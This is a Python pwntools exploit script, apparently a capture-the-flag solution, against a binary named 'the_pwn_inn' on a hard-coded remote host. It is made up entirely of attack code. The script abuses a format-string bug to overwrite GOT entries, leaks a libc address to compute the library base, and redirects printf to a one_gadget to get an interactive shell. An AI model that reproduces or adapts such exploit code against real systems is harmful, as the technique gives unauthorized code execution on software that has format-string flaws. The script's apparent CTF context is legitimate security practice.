from pwn import*
import sys 

LIBCFILE = '/lib/x86_64-linux-gnu/libc-2.31.so'
LIBCLOCAL = '/lib/x86_64-linux-gnu/libc-2.31.so'
BINFILE = './the_pwn_inn'
HOST = '161.97.176.150'
PORT = 2626
context.arch = 'amd64'


def solve(DEBUG):
    elf = ELF(BINFILE)
    libc = ELF(LIBCLOCAL)
    if DEBUG=="1":
        p = process(BINFILE)
        exploit(p,elf,libc)
    elif DEBUG=="2":
        elf = ELF(BINFILE)
        libc = ELF(LIBCFILE)
        p = remote(HOST,PORT)
        exploit(p,elf,libc)
    else:
        p = process(BINFILE)
        raw_input('DEBUG')
        exploit(p,elf,libc)
        
def exploit(p,elf,libc):

    got_exit = 0x404058
    got_printf = 0x404030
    vuln_11 = 0x004012cf
    vuln_0 = 0x4012c4
    plt_puts = 0x401040
    got_fgets = 0x404040
    got_puts = 0x404020
    pop_rdi =  0x4013f3
    ret = 0x40101a
    leave_ret = 0x40122c
    to_ret_main = 0x401369 
    main = 0x401328 
    offset_IO_file_jumps = 0x01c04a0
    memory = 0x404400
    offset_gadget =  0xe6e79# 0xe6ce9
    
    
    p.recvuntil("Welcome to the pwn inn! We hope that you enjoy your stay. What's your name? \n")    
    
    payload = fmtstr_payload(6, {got_exit: main})
    
    p.sendline(payload)
    
    
    p.recvuntil("Welcome to the pwn inn! We hope that you enjoy your stay. What's your name? \n") 
    
    payload2 = " -%7$s- "
    payload2 += p64(got_puts)
    
    p.sendline(payload2)
    
    p.recvuntil(" -")
    leak = p.recvuntil("- ")[:-2]
    addr_puts = u64(leak + "\x00"*2)
    print "leak puts: ", hex(addr_puts)
    
    base = addr_puts - 0x0875a0
    print "base: ", hex(base)
    
    p.recvuntil("Welcome to the pwn inn! We hope that you enjoy your stay. What's your name? \n")
    
    onegadget = base + 0xe6c81
    print "one: ", hex(onegadget)
    payload =  fmtstr_payload(6, {got_printf : onegadget})
    p.sendline(payload)
    
    
    p.interactive()
          
solve(sys.argv[1])